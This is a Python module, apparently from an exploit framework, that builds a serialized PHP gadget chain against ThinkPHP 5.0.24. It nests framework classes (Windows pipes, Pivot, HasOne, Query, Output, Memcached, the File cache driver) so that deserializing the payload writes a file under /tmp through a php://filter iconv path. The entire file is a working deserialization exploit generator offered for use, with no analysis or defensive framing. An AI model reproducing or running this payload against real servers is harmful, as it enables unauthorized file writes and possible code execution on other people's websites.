from phpserialize import *

META = {
    'params': ['cmd'],
    'name': 'thinkphp1',
    'description': '',
    'version': ('==5.0.24',),
}


@namespace('think\\cache\\driver')
class File:
    def __init__(self):
        self.protected_options = {
            'expire': 0,
            'cache_subdir': False,
            'path': 'php://filter/' +
                    'convert.iconv.ucs-2be.ucs-2le/' +
                    'resource=/tmp/' + META['file_prefix'],
            'prefix': '',
            'data_compress': False,
        }
        self.protected_tag = 'asdf'


@namespace('think\\session\\driver')
class Memcached:
    def __init__(self):
        self.protected_handler = File()


@namespace('think\\console')
class Output:
    def __init__(self):
        self.private_handle = Memcached()
        self.protected_styles = ['getAttr']


@namespace('think\\db')
class Query:
    def __init__(self):
        self.protected_model = Output()


@namespace('think\\model\\relation')
class HasOne:
    def __init__(self):
        self.protected_selfRelation = False
        self.protected_query = Query()
        self.protected_bindAttr = ['no', '123']


@namespace('think\\model')
class Pivot:
    def __init__(self):
        self.protected_append = ['getError']
        self.protected_error = HasOne()
        self.public_parent = Output()
        self.protected_selfRelation = False
        self.protected_query = Query()


@namespace('think\\process\\pipes')
class Windows:
    def __init__(self):
        self.private_files = [Pivot()]


def construct(file_prefix):
    META['file_prefix'] = file_prefix
    return serialize(Windows())
